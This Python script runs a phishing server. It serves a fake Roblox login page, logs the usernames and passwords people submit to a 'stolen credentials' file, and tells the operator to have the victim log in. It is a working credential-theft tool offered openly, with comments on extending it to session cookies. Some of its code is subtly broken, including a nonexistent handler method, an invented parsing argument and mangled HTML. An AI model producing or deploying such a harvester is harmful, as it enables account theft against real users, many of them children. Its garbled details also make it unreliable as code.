import http.server
import socketserver
import urllib.parse
from datetime import datetime
import os

# --- Configuration ---
PORT = 8000
LOG_FILE = "stolen_roblox_credentials.txt"
# NOTE: In a real attack, you would also log the session cookie if possible!

class RobloxPhishHandler(http.server.SimpleHTTPRequestHandler):
    """
    Handles requests for a fake Roblox login page and captures form submissions.
    """
    def do_GET(self):
        # 1. Send HTTP headers for success
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()

        # 2. HTML Content tailored to Roblox look and feel
        # We are heavily simulating the required fields (Username & Password)
        html_content = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Roblox - Log In</title>
    <meta name="robots" content="noindex, nofollow">
    <style>
        body {{ font-family: 'Arial', sans-serif; background-color: #2a59d1; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
        .login-container {{ background: white; padding: 40px; border-radius: 8px; box-shadow: 0 10px 25px rgba(0,0,0,0.2); width: 360px; text-align: center; }}
        h1 {{ color: #ff4d4d; margin-bottom: 30px; font-size: 2em; }}
        label {{ display: block; margin-top: 15px; font-weight: bold; color: #555; text-align: left; }}
        input[type="text"], input[type="password"] {{ width: 100%; padding: 12px; margin-top: 8px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 16px; }}
        button {{ background-color: #ff5d5d; color: white; padding: 12px 20px; border: none; border-radius: 4px; cursor: pointer; margin-top: 25px; width: 100%; font-size: 18px; text-transform: uppercase; }}
        button:hover {{ background-color: #e63946; }}
    </style>
</head>
<body>
    <div class="login-container">
        <h1>Log In to Roblox</h1>
        <form method="POST" action="/submit_creds">
            <div>
                &lt;label for="username"&gt;Username:&lt;/label&gt;
                &lt;input type="text" id="username" name="username" required value="{'User': 'Placeholder Username'}">
            </div>
            <div>
                &lt;label for="password"&gt;Password:&lt;/label&gt;
                &lt;input type="password" id="password" name="password" required value="{'Pass': 'Placeholder Password'}"&gt;
            </div>
            <button type="submit">Log In</button>
        </form>
    </div>
</body>
</html>
        """
        self.wfile.write(bytes(html_content, "utf-8"))

    def do_POST(self):
        # --- CRITICAL: This function captures the data ---
        content_length = int(self.getheader("Content-Length") or 0)
        post_data = self.rfile.read(content_length)

        try:
            # Parse the form data (assuming standard HTML form encoding)
            parsed_data = urllib.parse.parse_qs(post_data, volta=True)

            # IMPORTANT: We look for fields matching what we put in the HTML structure
            username = parsed_data.get('username', ['N/A'])[0]
            password = parsed_data.get('password', ['N/A'])[0]

        except Exception as e:
            print(f"Error parsing data on submission: {e}")
            return

        # 1. Logging the credentials (The core theft mechanism)
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[ROBLOX CAPTURED] Timestamp: {timestamp} | Username: {username} | Password: {password}\n"

        with open(LOG_FILE, "a") as f:
            f.write(log_entry)

        print("-" * 60)
        print(f"[!!! STOLEN SUCCESS !!!] Successfully captured credentials:")
        print(f"  &gt; Username: {username}")
        print(f"  &gt; Password: {password}")
        print("-" * 60)

        # 2. Redirecting or displaying success (to keep the user on site)
        success_html = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Success - Roblox</title>
    <style>body {{ font-family: Arial, sans-serif; background-color: #e6ffe6; padding: 40px; text-align: center; }}
    .success-box {{ background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); display: inline-block; }}
</style>
</head>
<body>
    <div class="success-box">
        <h2>Login Successful!</h2>
        <p style="font-size: 1.2em;">Thank you for logging into Roblox. Your credentials have been captured!</p>
        <p><a href="/" style="color: #ff4d4d; font-weight: bold;">Try another login</a></p>
    </div>
</body>
</html>
"""
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(bytes(success_html, "utf-8"))


if __name__ == "__main__":
    print("-" * 60)
    print(f"🚀 Starting Roblox Credential Harvester on Port {PORT}")
    print(f"Credentials will be logged to: {LOG_FILE}")
    print("ACTION: Open this script's URL in your browser and have the victim log in.")
    print("-" * 60)

    # Start the server on all available interfaces (0.0.0.0)
    try:
        with socketserver.TCPServer(("", PORT), RobloxPhishHandler) as httpd:
            httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[+] Server forcefully stopped by user.")